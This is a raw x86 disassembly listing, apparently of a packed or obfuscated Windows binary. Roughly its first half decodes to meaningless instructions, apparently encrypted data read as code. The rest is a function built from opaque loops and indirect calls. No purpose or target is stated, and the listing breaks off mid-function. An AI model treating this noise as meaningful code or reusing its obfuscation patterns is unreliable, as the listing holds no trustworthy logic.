  40fc16:	je     0x40fc3a
  40fc18:	test   eax,0xabfa69b3
  40fc1d:	push   cs
  40fc1e:	test   BYTE PTR [edi+eiz*1+0x39],dl
  40fc22:	sahf   
  40fc23:	nop
  40fc24:	ss mov al,0x8b
  40fc27:	mov    BYTE PTR [edi+0x72a2f2aa],dl
  40fc2d:	mov    eax,0xc283099b
  40fc32:	(bad)  
  40fc33:	retf   
  40fc34:	xor    eax,0xc040916c
  40fc39:	dec    edx
  40fc3a:	push   ebx
  40fc3b:	inc    ebp
  40fc3c:	mov    cl,0x49
  40fc3e:	pop    esi
  40fc3f:	xchg   ecx,eax
  40fc40:	mov    cs,WORD PTR [ebx+eiz*1+0x69fb35a3]
  40fc47:	sbb    eax,0x50cd5150
  40fc4c:	sub    BYTE PTR [ebx+0x59112001],bh
  40fc52:	stos   BYTE PTR es:[edi],al
  40fc53:	fwait
  40fc54:	aas    
  40fc55:	cs js  0x40fc32
  40fc58:	pop    esi
  40fc59:	ins    DWORD PTR es:[edi],dx
  40fc5a:	mov    ah,0xad
  40fc5c:	retf   
  40fc5d:	(bad)  
  40fc5e:	fwait
  40fc5f:	inc    esp
  40fc60:	push   ss
  40fc61:	outs   dx,BYTE PTR ds:[esi]
  40fc62:	lock test DWORD PTR [ebp+0x2ad8309c],esi
  40fc69:	xor    DWORD PTR [ecx],ebp
  40fc6b:	lods   al,BYTE PTR ds:[esi]
  40fc6c:	fisub  WORD PTR [eax+0x50]
  40fc6f:	(bad)  
  40fc70:	pop    ecx
  40fc71:	adc    al,0x28
  40fc73:	outs   dx,DWORD PTR ds:[esi]
  40fc74:	ret    
  40fc75:	test   al,0x61
  40fc77:	cmp    DWORD PTR [ebx+edi*2],ecx
  40fc7a:	fdiv   st(5),st
  40fc7c:	rcl    BYTE PTR [esi+0x24332ab],cl
  40fc82:	pop    ebp
  40fc83:	ficom  WORD PTR [edi+edx*1+0x43ac3fa]
  40fc8a:	or     BYTE PTR [ebp+0x3d93dd3a],dl
  40fc90:	inc    edi
  40fc91:	push   0x7a
  40fc93:	into   
  40fc94:	pop    eax
  40fc95:	inc    ebp
  40fc96:	mov    edx,0x19951295
  40fc9b:	push   esp
  40fc9c:	dec    edi
  40fc9d:	jmp    FWORD PTR [ecx]
  40fc9f:	push   ss
  40fca0:	dec    ebp
  40fca1:	lods   al,BYTE PTR ds:[esi]
  40fca2:	popa   
  40fca3:	in     eax,dx
  40fca4:	das    
  40fca5:	jge    0x40fc6d
  40fca7:	inc    edi
  40fca8:	sub    al,0x56
  40fcaa:	das    
  40fcab:	shr    dh,1
  40fcad:	inc    eax
  40fcae:	mov    ebp,0x566a29f5
  40fcb3:	mov    ebp,0xea4d1bbb
  40fcb8:	in     eax,dx
  40fcb9:	sub    edi,eax
  40fcbb:	ins    DWORD PTR es:[edi],dx
  40fcbc:	cmp    eax,0x29153f65
  40fcc1:	pop    ss
  40fcc2:	add    bh,dl
  40fcc4:	jl     0x40fcf2
  40fcc6:	je     0x40fceb
  40fcc8:	mov    ebx,0x423eb15c
  40fccd:	pusha  
  40fcce:	mov    dh,0xa1
  40fcd0:	test   ebp,esp
  40fcd2:	mov    esp,0xdd3ef1c8
  40fcd7:	out    0xed,al
  40fcd9:	jb     0x40fd4f
  40fcdb:	out    0xea,al
  40fcdd:	nop
  40fcde:	das    
  40fcdf:	inc    esi
  40fce0:	gs ja  0x40fcc8
  40fce3:	lods   eax,DWORD PTR ds:[esi]
  40fce4:	jmp    0xbb95:0x568f5097
  40fceb:	stos   BYTE PTR es:[edi],al
  40fcec:	xchg   edi,eax
  40fced:	loopne 0x40fcb0
  40fcef:	sbb    ch,BYTE PTR [ebx+0x71150200]
  40fcf5:	lods   eax,DWORD PTR ds:[esi]
  40fcf6:	nop
  40fcf7:	push   edi
  40fcf8:	sub    bl,BYTE PTR [ebx+0x69]
  40fcfb:	mov    ah,0xa7
  40fcfd:	adc    DWORD PTR [eax-0x371cd52f],esp
  40fd03:	xchg   ebp,eax
  40fd04:	jmp    0xab2c8762
  40fd09:	xor    al,0xb1
  40fd0b:	std    
  40fd0c:	int    0x75
  40fd0e:	add    al,0x62
  40fd10:	iret   
  40fd11:	aad    0x6e
  40fd13:	mov    al,0xa6
  40fd15:	jecxz  0x40fd0a
  40fd17:	(bad)  
  40fd18:	shr    BYTE PTR [eax+0x3b1ac11],0xa2
  40fd1f:	int    0xa0
  40fd21:	daa    
  40fd22:	adc    dl,ah
  40fd24:	cmp    al,BYTE PTR [esi+esi*2]
  40fd27:	addr16 pushf 
  40fd29:	mov    ebx,edx
  40fd2b:	xchg   esi,eax
  40fd2c:	inc    ecx
  40fd2d:	lock out 0xde,eax
  40fd30:	out    0x9b,eax
  40fd32:	retf   
  40fd33:	mov    edx,0xcde14043
  40fd38:	sar    ah,cl
  40fd3a:	cmp    eax,0xb33a1563
  40fd3f:	ror    DWORD PTR [eax],1
  40fd41:	and    eax,0xe7af6f19
  40fd46:	ret    0x98a2
  40fd49:	int    0x78
  40fd4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd4c:	pop    ebx
  40fd4d:	addr16 pop ebp
  40fd4f:	pushf  
  40fd50:	clc    
  40fd51:	push   0xd9ce3b8a
  40fd56:	or     eax,0x8b666868
  40fd5b:	mov    al,0x3a
  40fd5d:	xchg   esp,eax
  40fd5e:	(bad)  
  40fd5f:	fiadd  DWORD PTR [esi-0x1d]
  40fd62:	mov    eax,0x59448376
  40fd67:	cmp    BYTE PTR [edi],cl
  40fd69:	enter  0x8dd8,0xb
  40fd6d:	mov    al,ds:0xd4c20d63
  40fd72:	mov    WORD PTR [edi+0x45de489b],ss
  40fd78:	sbb    esp,esp
  40fd7a:	jne    0x40fdf2
  40fd7c:	or     eax,0xadc278e3
  40fd81:	ret    
  40fd82:	jmp    0xbfda568f
  40fd87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fd88:	cdq    
  40fd89:	cmp    esi,DWORD PTR [edi-0x60]
  40fd8c:	inc    ecx
  40fd8d:	xor    BYTE PTR ds:0x3ceb3cae,al
  40fd93:	sbb    al,0x40
  40fd95:	xchg   BYTE PTR [eax-0x68],bl
  40fd98:	int    0x43
  40fd9a:	fs (bad) 
  40fd9c:	sar    dh,cl
  40fd9e:	in     al,0x2c
  40fda0:	mov    ch,0xc
  40fda2:	aas    
  40fda3:	or     edx,ebp
  40fda5:	or     esp,eax
  40fda7:	jbe    0x40fdee
  40fda9:	jns    0x40fe15
  40fdab:	mov    edi,0x4d7bb5d
  40fdb0:	aas    
  40fdb1:	aaa    
  40fdb2:	adc    ebx,DWORD PTR [edx+0x25cfdcae]
  40fdb8:	mov    ds:0x99da25cc,al
  40fdbd:	cmp    DWORD PTR [eax+ebp*8],edi
  40fdc0:	or     al,0xff
  40fdc2:	xchg   BYTE PTR [ecx],ah
  40fdc4:	mov    cl,0x63
  40fdc6:	xlat   BYTE PTR ds:[ebx]
  40fdc7:	int3   
  40fdc8:	mov    DWORD PTR [esi],esp
  40fdca:	and    eax,0xf7183075
  40fdcf:	mov    al,0x6f
  40fdd1:	es xchg edi,eax
  40fdd3:	fimul  WORD PTR [esi+0x40a30a95]
  40fdd9:	mov    al,ds:0x26015543
  40fdde:	stos   DWORD PTR es:[edi],eax
  40fddf:	ja     0x40fe14
  40fde1:	xlat   BYTE PTR ds:[ebx]
  40fde2:	fwait
  40fde3:	cs xchg ebx,eax
  40fde5:	outs   dx,BYTE PTR ds:[esi]
  40fde6:	lock fistp DWORD PTR [eax+0x2]
  40fdea:	fisubr WORD PTR [ecx+0x51]
  40fded:	dec    edx
  40fdee:	repnz ds sbb eax,0xaa72db40
  40fdf5:	pop    ebx
  40fdf6:	and    edi,DWORD PTR [esi-0x61bca54a]
  40fdfc:	hlt    
  40fdfd:	mov    cl,0x34
  40fdff:	sub    DWORD PTR [ecx+0x7e608856],ebp
  40fe05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe06:	cmc    
  40fe07:	mov    ebp,0xda270af1
  40fe0c:	shl    DWORD PTR [edx+0x19],cl
  40fe0f:	js     0x40fdff
  40fe11:	or     al,0x6c
  40fe13:	push   0x6d73df5c
  40fe18:	xor    ch,dh
  40fe1a:	out    dx,eax
  40fe1b:	cld    
  40fe1c:	jo     0x40fe1b
  40fe1e:	arpl   WORD PTR [ebx+ebx*2],di
  40fe21:	pop    si
  40fe23:	and    esi,ebp
  40fe25:	dec    ecx
  40fe26:	xchg   al,dh
  40fe28:	loop   0x40fdc7
  40fe2a:	cli    
  40fe2b:	pop    ebx
  40fe2c:	les    esp,FWORD PTR [edx]
  40fe2e:	fwait
  40fe2f:	or     BYTE PTR [ecx-0x36],dl
  40fe32:	add    esi,DWORD PTR [eax+0x316cffb3]
  40fe38:	cmp    dh,BYTE PTR [esi]
  40fe3a:	mov    fs,WORD PTR [edx-0x4dac2e5]
  40fe40:	adc    al,0x39
  40fe42:	inc    ebp
  40fe43:	gs jecxz 0x40fe2b
  40fe46:	retf   
  40fe47:	jecxz  0x40febc
  40fe49:	or     edi,DWORD PTR [ebx]
  40fe4b:	test   eax,0xa66ff67b
  40fe50:	xchg   esp,eax
  40fe51:	outs   dx,DWORD PTR ds:[esi]
  40fe52:	mov    al,0xb3
  40fe54:	pop    ebp
  40fe55:	cmp    BYTE PTR fs:[edi+0x4b],dh
  40fe59:	mov    esi,0xec8e7d8
  40fe5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fe5f:	sbb    dl,BYTE PTR [ecx]
  40fe61:	inc    edx
  40fe62:	adc    al,ah
  40fe64:	xor    ecx,ebx
  40fe66:	(bad)  
  40fe68:	xchg   DWORD PTR [ecx-0x73],esp
  40fe6b:	xor    BYTE PTR [ebx+0x7d307866],bl
  40fe71:	xchg   edi,eax
  40fe72:	mov    ebp,es
  40fe74:	jne    0x40fe67
  40fe76:	dec    ecx
  40fe77:	mov    al,ds:0xd8b4ab03
  40fe7c:	cs jl  0x40fe26
  40fe7f:	pop    edi
  40fe80:	push   ss
  40fe81:	test   eax,0xc8dd81c6
  40fe86:	repz (bad) 
  40fe88:	jns    0x40febb
  40fe8a:	ret    
  40fe8b:	loop   0x40fee1
  40fe8d:	jle    0x40feb1
  40fe8f:	or     eax,0x21904386
  40fe94:	aad    0x67
  40fe96:	lods   eax,DWORD PTR ds:[esi]
  40fe97:	mov    WORD PTR [ecx+ebp*2],ss
  40fe9a:	inc    eax
  40fe9b:	in     al,dx
  40fe9c:	in     al,0x9d
  40fe9e:	mov    bh,0xb
  40fea0:	jmp    DWORD PTR [ebx+0x2045b9b5]
  40fea6:	mov    esp,0x7e2eac02
  40feab:	retf   0x3793
  40feae:	or     al,0xa9
  40feb1:	leave  
  40feb2:	fsubr  QWORD PTR [ebx+0x4f]
  40feb5:	cwde   
  40feb6:	scas   eax,DWORD PTR es:[edi]
  40feb7:	adc    edx,DWORD PTR [edx+0x63]
  40feba:	dec    eax
  40febb:	mov    bh,0x87
  40febd:	int    0x96
  40febf:	stc    
  40fec0:	int    0x49
  40fec2:	out    dx,eax
  40fec3:	jge    0x40fe7d
  40fec5:	(bad)  
  40fec6:	sub    esi,ecx
  40fec8:	bound  esi,QWORD PTR [ebp-0x66944658]
  40fece:	loopne 0x40fe98
  40fed0:	push   esp
  40fed1:	sub    edi,DWORD PTR [edx-0x74c13037]
  40fed7:	inc    ebp
  40fed8:	or     al,0x33
  40feda:	sar    BYTE PTR [ecx+0x7264fca9],cl
  40fee0:	jmp    0x4101ff
  40fee5:	or     eax,0xf19cc125
  40feea:	pop    eax
  40feeb:	jno    0x40fea2
  40feed:	xchg   ecx,eax
  40feee:	add    eax,0xdff74346
  40fef3:	pop    ebx
  40fef4:	(bad)  
  40fef5:	fidiv  WORD PTR [ebp+0x7d7c7e7e]
  40fefb:	jle    0x40ff7b
  40fefd:	mov    al,0x3a
  40feff:	iret   
  40ff00:	or     BYTE PTR [edx],ah
  40ff02:	mov    eax,ds:0xbd2cab70
  40ff07:	pusha  
  40ff08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff09:	dec    ebp
  40ff0a:	dec    esp
  40ff0b:	mov    dh,0xf3
  40ff0d:	cwde   
  40ff0e:	mov    ecx,?
  40ff10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff11:	mov    al,0xbd
  40ff13:	sbb    ecx,eax
  40ff15:	fstp   DWORD PTR [esi+ecx*1-0x68]
  40ff19:	cmp    DWORD PTR [esi+0x5afa230d],ebp
  40ff1f:	mov    ecx,0x6efd4807
  40ff24:	fistp  DWORD PTR [esi-0x2a557c9]
  40ff2a:	outs   dx,DWORD PTR ds:[esi]
  40ff2b:	rol    BYTE PTR [ebp+0x2e],0x47
  40ff2f:	mov    dl,0x6e
  40ff31:	mov    dl,0xc8
  40ff33:	test   esi,0xdff9d1ff
  40ff39:	mov    ch,0xbb
  40ff3b:	push   esp
  40ff3c:	pop    eax
  40ff3d:	mov    edx,0xe5d0d367
  40ff42:	(bad)  
  40ff43:	and    edi,DWORD PTR [eax]
  40ff45:	add    cl,BYTE PTR [edx+0x38]
  40ff48:	int    0xa9
  40ff4a:	mov    eax,0xe4874039
  40ff4f:	push   eax
  40ff50:	sub    eax,DWORD PTR [ebp+0x63621f86]
  40ff56:	or     dl,bl
  40ff58:	shl    DWORD PTR [esi+eiz*4+0x5a],cl
  40ff5c:	xor    eax,0x6f24a797
  40ff61:	sbb    eax,0x87faa4ee
  40ff66:	mov    ah,0xa4
  40ff68:	add    eax,eax
  40ff6a:	lock rcl DWORD PTR [esi-0x67c270f4],0xe8
  40ff72:	bnd jns 0x40ff1b
  40ff75:	loope  0x40ff9e
  40ff77:	xor    bl,BYTE PTR [esi]
  40ff79:	in     eax,0x37
  40ff7b:	dec    ecx
  40ff7c:	xchg   ebx,eax
  40ff7d:	dec    ecx
  40ff7e:	cld    
  40ff7f:	cmp    eax,0x825e8dbc
  40ff84:	dec    ebx
  40ff85:	jle    0x40fff6
  40ff87:	mov    al,0x1f
  40ff89:	jb     0x40ff30
  40ff8b:	clc    
  40ff8c:	inc    eax
  40ff8d:	sbb    eax,0xf465c98a
  40ff92:	in     al,dx
  40ff93:	xlat   BYTE PTR ds:[ebx]
  40ff94:	popa   
  40ff95:	clc    
  40ff96:	(bad)  
  40ff98:	ret    
  40ff99:	adc    al,0xef
  40ff9b:	stos   BYTE PTR es:[edi],al
  40ff9c:	xchg   ebp,eax
  40ff9d:	mov    al,bh
  40ff9f:	test   al,0x6f
  40ffa1:	jb     0x40ff34
  40ffa3:	push   ss
  40ffa4:	adc    dh,BYTE PTR [esi-0x564a6d74]
  40ffaa:	cmc    
  40ffab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ffac:	outs   dx,BYTE PTR ds:[esi]
  40ffad:	cmp    bl,BYTE PTR [esi]
  40ffaf:	(bad)  
  40ffb0:	(bad)  
  40ffb1:	push   edx
  40ffb2:	scas   al,BYTE PTR es:[edi]
  40ffb3:	mov    dh,0x41
  40ffb5:	mov    eax,0x48a4882e
  40ffba:	xchg   edx,eax
  40ffbb:	mov    eax,0xa2d0ab2a
  40ffc0:	jecxz  0x40ff8e
  40ffc2:	jmp    0x7b94:0xf33c10c9
  40ffc9:	adc    DWORD PTR [esi+0x15789dd1],edi
  40ffcf:	test   al,0xb1
  40ffd1:	dec    edi
  40ffd2:	mov    ch,0x28
  40ffd4:	aad    0x62
  40ffd6:	(bad)  
  40ffd7:	pusha  
  40ffd8:	and    DWORD PTR [eax-0x57],ebp
  40ffdb:	retf   0x91cf
  40ffde:	scas   eax,DWORD PTR es:[edi]
  40ffdf:	icebp  
  40ffe0:	pop    ds
  40ffe1:	cmp    ah,BYTE PTR [edx+ebx*1+0xfcec2ec]
  40ffe8:	jb     0x40ffb2
  40ffea:	fdivr  QWORD PTR [esi]
  40ffec:	jge    0x40ffeb
  40ffee:	mov    edi,0x584577ed
  40fff3:	stos   DWORD PTR es:[edi],eax
  40fff4:	outs   dx,BYTE PTR ds:[esi]
  40fff5:	pop    ds
  40fff6:	dec    esi
  40fff7:	or     BYTE PTR [ecx+ebx*2+0x735d7e6f],0x12
  40ffff:	fistp  WORD PTR [ecx+edi*1-0x12]
  410003:	pushf  
  410004:	or     al,0xcf
  410006:	mov    DWORD PTR [edx-0x37],esi
  410009:	gs inc esi
  41000b:	pop    esp
  41000c:	ja     0x410029
  41000e:	popf   
  41000f:	dec    edx
  410010:	xchg   ebx,eax
  410011:	jmp    0x40ffdb
  410013:	and    eax,0xb16eb3fe
  410018:	(bad)  
  410019:	hlt    
  41001a:	mov    DWORD PTR [esi-0x4c9ae7c3],esi
  410020:	pop    ss
  410021:	pop    edx
  410022:	pop    esp
  410023:	xor    edx,ebp
  410025:	and    ecx,ebp
  410027:	out    0xc9,eax
  410029:	ja     0x41001a
  41002b:	and    al,0x85
  41002d:	mov    al,0x38
  410030:	mov    dh,0xcb
  410032:	jge    0x41006d
  410034:	pusha  
  410035:	out    0xab,al
  410037:	mov    ebp,0x936b76eb
  41003c:	cdq    
  41003d:	test   DWORD PTR [esi],ebx
  41003f:	xchg   BYTE PTR [eax-0x31220ecd],dl
  410045:	xchg   edx,eax
  410046:	pop    edi
  410047:	(bad)  
  410048:	outs   dx,DWORD PTR ds:[esi]
  410049:	sbb    eax,DWORD PTR [ecx+0x6e6ce6ec]
  41004f:	out    dx,eax
  410050:	out    dx,al
  410051:	pop    ss
  410052:	xchg   esp,ebx
  410054:	aaa    
  410055:	push   ecx
  410056:	jne    0x41005d
  410058:	cmp    al,0xcb
  41005a:	or     eax,0x82b018a0
  41005f:	mov    ds:0xcc9c4183,al
  410064:	mov    cl,0xe1
  410066:	push   ebx
  410067:	sbb    eax,0x5eb2d5be
  41006c:	int    0xfd
  41006e:	mov    dl,0x8a
  410070:	inc    ecx
  410071:	xchg   DWORD PTR [ebp+0x63],esp
  410074:	xchg   esp,eax
  410075:	loop   0x41003c
  410077:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410078:	or     al,0x61
  41007a:	fisttp WORD PTR [ebx]
  41007c:	sahf   
  41007d:	pusha  
  41007e:	out    0x7e,al
  410080:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410081:	das    
  410082:	in     al,dx
  410083:	ss xchg esi,eax
  410085:	test   BYTE PTR [eax+0x1f918158],bl
  41008b:	and    eax,0x212d0abb
  410090:	scas   al,BYTE PTR es:[edi]
  410091:	out    0x11,eax
  410093:	xchg   ebx,eax
  410094:	mov    edx,0x909fe15f
  410099:	(bad)  
  41009a:	sti    
  41009b:	jecxz  0x410111
  41009d:	mov    ecx,0x4ba1d17a
  4100a2:	mov    al,ds:0x4c2e321a
  4100a7:	sub    BYTE PTR [ebx+0x65036eff],0xef
  4100ae:	jo     0x4100f2
  4100b0:	sbb    BYTE PTR [esi-0x6655cda8],0xc9
  4100b7:	xchg   ebx,eax
  4100b8:	jns    0x4100c3
  4100ba:	and    ah,BYTE PTR [esi]
  4100bc:	stc    
  4100bd:	xchg   DWORD PTR gs:[edx-0x2f],edi
  4100c1:	adc    eax,0xf35d4255
  4100c6:	ror    BYTE PTR [edi+eax*4],0x81
  4100ca:	push   0x26
  4100cc:	mov    ch,0x6
  4100ce:	ds jecxz 0x4100f8
  4100d1:	repnz in al,dx
  4100d3:	sub    al,0x10
  4100d5:	outs   dx,DWORD PTR ds:[esi]
  4100d6:	and    al,0x5c
  4100d8:	sub    eax,0x28cea4b2
  4100dd:	scas   al,BYTE PTR es:[edi]
  4100de:	sti    
  4100df:	pop    ebx
  4100e0:	sbb    ah,BYTE PTR [ebx-0x18]
  4100e3:	aas    
  4100e4:	add    edi,ebx
  4100e6:	aad    0x96
  4100e8:	iret   
  4100e9:	cwde   
  4100ea:	out    0xb9,al
  4100ec:	ss pop edi
  4100ee:	dec    ebp
  4100ef:	out    0xfb,al
  4100f1:	jge    0x4100a9
  4100f3:	sub    dh,BYTE PTR [ecx]
  4100f5:	mov    fs,WORD PTR [edx-0x7030d6ba]
  4100fb:	adc    eax,0x12676863
  410100:	aas    
  410101:	fmul   QWORD PTR [edi-0x1a]
  410104:	pop    esp
  410105:	jge    0x41011d
  410107:	clc    
  410108:	mov    ebx,esi
  41010a:	push   edx
  41010b:	xchg   eax,esp
  41010d:	imul   esi,DWORD PTR [edx],0xffffff8e
  410110:	cmp    BYTE PTR [ebp+0x5d],bl
  410113:	iret   
  410114:	inc    edx
  410115:	cld    
  410116:	ror    DWORD PTR [edx-0x9],cl
  410119:	gs out dx,al
  41011b:	arpl   WORD PTR ds:[ecx-0x432c4080],dx
  410122:	sahf   
  410123:	jno    0x4100bd
  410125:	cmc    
  410126:	shl    DWORD PTR [ecx+0x59],0x84
  41012a:	repz fwait
  41012c:	das    
  41012d:	pushf  
  41012e:	out    dx,eax
  41012f:	pushf  
  410130:	data16 or al,BYTE PTR [esi]
  410133:	aaa    
  410134:	repnz loopne 0x410167
  410137:	sub    eax,0x9d520a17
  41013c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41013d:	ins    BYTE PTR es:[edi],dx
  41013e:	jae    0x41016d
  410140:	push   ebp
  410141:	repnz dec ebx
  410143:	shr    DWORD PTR [ebp+0x60d64b1f],0x75
  41014a:	and    al,BYTE PTR [ebx+0x38]
  41014d:	xor    BYTE PTR [edx-0x6f],0x61
  410151:	sbb    al,0x5
  410153:	pop    eax
  410154:	jo     0x41014d
  410156:	not    DWORD PTR [edx+0x7e]
  410159:	fdivr  DWORD PTR fs:[ebx+ecx*2+0xc9b5a8b]
  410161:	nop
  410162:	xlat   BYTE PTR ds:[ebx]
  410163:	xchg   ecx,eax
  410164:	sti    
  410165:	or     ch,BYTE PTR [ecx+0x4fe339d3]
  41016b:	repz test eax,0x5ffd0c1c
  410171:	lods   eax,DWORD PTR ds:[esi]
  410172:	dec    ebp
  410173:	cmp    BYTE PTR [esi-0x19c41efa],bl
  410179:	addr16 sbb eax,0x30c9913f
  41017f:	outs   dx,BYTE PTR ds:[esi]
  410180:	cmp    esp,ecx
  410182:	xbegin 0xbe41fb3d
  410188:	shl    esi,0xf8
  41018b:	mov    WORD PTR ds:0x33aef7e0,di
  410192:	pop    ebx
  410193:	jge    0x410143
  410195:	adc    DWORD PTR [esi-0x58],edi
  410198:	dec    ecx
  410199:	xchg   ebx,eax
  41019a:	into   
  41019b:	jno    0x41018d
  41019d:	les    ebp,FWORD PTR [edi-0x75d00485]
  4101a3:	mov    ds:0x25fac45b,eax
  4101a8:	(bad)  
  4101a9:	cmp    eax,0xeb1e4d91
  4101ae:	imul   ebx,DWORD PTR [edx],0x19
  4101b1:	mov    ds:0xbb1c39fb,al
  4101b6:	xchg   esp,eax
  4101b7:	dec    esp
  4101b8:	in     eax,dx
  4101b9:	pushf  
  4101ba:	push   edx
  4101bb:	or     bl,BYTE PTR [ecx]
  4101bd:	push   esp
  4101be:	push   ss
  4101bf:	int3   
  4101c0:	and    esi,DWORD PTR [ebx-0x1f2e2da7]
  4101c6:	inc    edx
  4101c7:	aaa    
  4101c8:	pop    esi
  4101c9:	cmp    WORD PTR [ebx],0x6b99
  4101ce:	dec    ebp
  4101cf:	and    edi,DWORD PTR [ecx+0x26]
  4101d2:	add    al,0xa1
  4101d4:	mov    ecx,0x412ed8e3
  4101d9:	cmp    bh,BYTE PTR [eax-0x5b10397d]
  4101df:	add    eax,DWORD PTR [ecx]
  4101e1:	push   ebp
  4101e2:	out    dx,al
  4101e3:	ret    
  4101e4:	dec    esi
  4101e5:	xchg   edx,eax
  4101e6:	and    esp,DWORD PTR [ecx-0x58]
  4101e9:	in     al,0x9
  4101eb:	adc    cl,cl
  4101ed:	nop
  4101ee:	add    al,0xa
  4101f0:	loop   0x4101ea
  4101f2:	pop    ds
  4101f3:	pop    ebx
  4101f4:	inc    ecx
  4101f5:	cmp    al,0xed
  4101f7:	dec    esi
  4101f8:	pop    DWORD PTR [esi+edi*1+0x69]
  4101fc:	or     al,0x31
  4101fe:	(bad)  
  410200:	icebp  
  410201:	mov    ecx,DWORD PTR [ebp+0x10]
  410204:	and    ecx,eax
  410206:	or     ecx,0x81161d8f
  41020c:	mov    eax,ecx
  41020e:	pop    ebp
  41020f:	ret    0x18
  410212:	push   ebp
  410213:	mov    ebp,esp
  410215:	sub    esp,0x58
  410218:	mov    ecx,DWORD PTR ds:0x43369f
  41021e:	adc    DWORD PTR ds:0x4336d7,ecx
  410224:	mov    ecx,DWORD PTR [ebp+0x8]
  410227:	and    eax,0x4408
  41022c:	mov    eax,0x8a3c
  410231:	xor    ax,WORD PTR [ecx+0x20]
  410235:	sub    ecx,0x2534
  41023b:	mov    ecx,0x3b02
  410240:	or     DWORD PTR ds:0x43360b,0x3241
  41024a:	add    ax,cx
  41024d:	xor    DWORD PTR ds:0x43372b,0x1afb
  410257:	movzx  eax,ax
  41025a:	and    ecx,0x4b4d
  410260:	mov    DWORD PTR [ebp-0xc],eax
  410263:	xor    ecx,ecx
  410265:	xor    ecx,DWORD PTR ds:0x4336df
  41026b:	or     DWORD PTR ds:0x4336d7,ecx
  410271:	mov    BYTE PTR [ebp-0x1],0x7f
  410275:	and    DWORD PTR ds:0x4336ab,0x0
  41027f:	jmp    0x410291
  410284:	mov    ecx,DWORD PTR ds:0x4336ab
  41028a:	inc    ecx
  41028b:	mov    DWORD PTR ds:0x4336ab,ecx
  410291:	cmp    DWORD PTR ds:0x4336ab,0x14
  410298:	jae    0x4102ed
  41029e:	cmp    DWORD PTR ds:0x4336ab,0xb
  4102a5:	jne    0x4102c6
  4102ab:	push   DWORD PTR [ebp-0x28]
  4102ae:	push   0x4636
  4102b3:	push   0x8d9e
  4102b8:	push   0x8baf
  4102bd:	push   DWORD PTR [ebp-0x18]
  4102c0:	call   DWORD PTR ds:0x412374
  4102c6:	cmp    DWORD PTR ds:0x4336ab,0xa
  4102cd:	jne    0x4102e2
  4102d3:	xor    ecx,ecx
  4102d5:	add    ecx,DWORD PTR ds:0x4336ab
  4102db:	inc    ecx
  4102dc:	mov    DWORD PTR ds:0x4336ab,ecx
  4102e2:	jmp    0x410284
  4102e7:	sbb    ecx,DWORD PTR ds:0x433603
  4102ed:	lea    eax,[ebp-0x1]
  4102f0:	mov    DWORD PTR [ebp-0x10],eax
  4102f3:	mov    al,BYTE PTR [ebp-0x1]
  4102f6:	mov    ecx,DWORD PTR [ebp-0x10]
  4102f9:	sub    DWORD PTR ds:0x4336e7,0x43369f
  410303:	xor    al,0x46
  410305:	xor    DWORD PTR ds:0x4336e3,0x433697
  41030f:	sub    al,0x38
  410311:	mov    BYTE PTR [ecx],al
  410313:	movzx  ecx,WORD PTR ds:0x433657
  41031a:	sub    DWORD PTR ds:0x43361f,ecx
  410320:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  410327:	mov    DWORD PTR [ebp-0x10],0xf89c8532
  41032e:	and    DWORD PTR ds:0x43365b,0x0
  410338:	mov    ecx,DWORD PTR ds:0x43365b
  41033e:	inc    ecx
  41033f:	mov    DWORD PTR ds:0x43365b,ecx
  410345:	cmp    DWORD PTR ds:0x43365b,0x25
  41034c:	jne    0x410362
  410352:	push   0x4337af
  410357:	push   0x4337ef
  41035c:	call   DWORD PTR ds:0x4120f4
  410362:	cmp    DWORD PTR ds:0x43365b,0x16
  410369:	jb     0x410338
  41036f:	adc    DWORD PTR ds:0x43369f,edx
  410375:	mov    eax,DWORD PTR [ebp-0x8]
  410378:	and    DWORD PTR ds:0x433713,0x0
  410382:	mov    ecx,DWORD PTR ds:0x433713
  410388:	inc    ecx
  410389:	mov    DWORD PTR ds:0x433713,ecx
  41038f:	cmp    DWORD PTR ds:0x433713,0xf
  410396:	jne    0x4103ac
  41039c:	push   0x4336e7
  4103a1:	push   0x178b
  4103a6:	call   DWORD PTR ds:0x412378
  4103ac:	cmp    DWORD PTR ds:0x433713,0xe
  4103b3:	jne    0x4103c8
  4103b9:	xor    ecx,ecx
  4103bb:	xor    ecx,DWORD PTR ds:0x433713
  4103c1:	inc    ecx
  4103c2:	mov    DWORD PTR ds:0x433713,ecx
  4103c8:	cmp    DWORD PTR ds:0x433713,0x1b
  4103cf:	jb     0x410382
  4103d5:	sub    DWORD PTR ds:0x43365f,edx
  4103db:	mov    ecx,0x7510854
  4103e0:	push   esi
  4103e1:	and    DWORD PTR ds:0x433657,0x0
  4103eb:	jmp    0x4103ff
  4103f0:	xor    esi,esi
  4103f2:	add    esi,DWORD PTR ds:0x433657
  4103f8:	inc    esi
  4103f9:	mov    DWORD PTR ds:0x433657,esi
  4103ff:	cmp    DWORD PTR ds:0x433657,0x1d
  410406:	jae    0x410427
  41040c:	cmp    DWORD PTR ds:0x433657,0x26
  410413:	jne    0x410422
  410419:	push   DWORD PTR [ebp-0x24]
  41041c:	call   DWORD PTR ds:0x4122b4
  410422:	jmp    0x4103f0
  410427:	xor    eax,ecx
  410429:	mov    esi,0x32729b
  41042e:	add    eax,esi
  410430:	jmp    0x41043d
  410435:	mov    dl,BYTE PTR [ebp-0x1]
  410438:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  41043c:	inc    eax
  41043d:	cmp    eax,0x40
  410440:	jb     0x410435
  410446:	mov    edx,DWORD PTR [ebp-0x8]
  410449:	mov    eax,DWORD PTR [ebp-0xc]
  41044c:	xor    edx,ecx
  41044e:	add    edx,esi
  410450:	cmp    edx,eax
  410452:	je     0x410766
  410458:	push   ebx
  410459:	push   edi
  41045a:	mov    edi,DWORD PTR [ebp+0x8]
  41045d:	mov    eax,0x8a3c
  410462:	xor    ax,WORD PTR [edi+edx*4+0x2]
  410467:	mov    edi,0x3b02
  41046c:	add    ax,di
